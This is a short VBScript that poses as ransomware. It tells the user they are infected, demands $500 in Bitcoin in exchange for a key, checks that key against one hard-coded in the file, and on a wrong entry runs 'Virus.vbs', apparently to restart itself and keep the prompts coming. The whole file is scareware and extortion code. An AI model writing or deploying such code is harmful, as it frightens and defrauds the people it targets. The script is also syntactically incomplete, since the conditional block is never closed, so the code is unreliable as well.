
msgbox("You've been infected! To disable your virus, please send $500 worth of Bitcoin to BLOCKED to receive your access key. Click 'OK' to continue.")
pass=inputbox("Please enter your 10-digit key to disable the virus. Send $500 worth of Bitcoin to BLOCKED, then send an email to BLOCKED with your email and proof. Your key will get sent to you.")
if pass="0x9dk2sm87" then msgbox("Correct key! Virus has been disabled. Let BLOCKED know to delete the virus.") else Set Shell=CreateObject("wscript.shell")

Shell.Run("Virus.vbs")
